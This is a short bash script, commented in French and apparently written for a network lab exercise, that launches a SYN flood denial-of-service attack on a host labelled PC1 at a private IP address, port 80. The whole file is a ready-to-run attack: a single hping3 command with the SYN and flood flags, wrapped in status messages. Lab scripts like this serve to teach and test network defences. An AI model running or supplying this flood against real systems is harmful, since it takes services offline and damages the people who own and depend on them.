#!/bin/bash

echo "=== SYN Flood Attack ==="
echo "Objectif: Deni de service sur PC1"

CIBLE_IP="192.168.189.200"
PORT=80
INTERFACE="ens224"

echo "Attaque SYN Flood sur $CIBLE_IP:$PORT"
echo "Appuyer sur Ctrl+C pour arreter"
echo ""

hping3 -S -p $PORT --flood $CIBLE_IP -V

echo "Attaque terminee."
